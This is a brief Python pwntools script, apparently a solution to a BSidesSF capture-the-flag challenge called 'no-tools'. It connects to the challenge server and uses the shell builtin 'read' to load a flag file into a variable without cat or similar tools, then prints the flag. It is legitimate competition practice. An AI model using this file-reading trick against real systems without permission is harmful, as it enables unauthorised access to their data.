#!/usr/bin/env python3
from pwn import *
import re

r = remote('no-tools-628c6895.challenges.bsidessf.net', 4445)

r.sendlineafter(b'$ ', b'read flag < /home/ctf/flag.txt')
r.sendlineafter(b'$ ', b'echo $flag')
r.recvline()

flag = r.recvline().strip().decode()

print(re.search(r'CTF{.+}', flag).group(0))
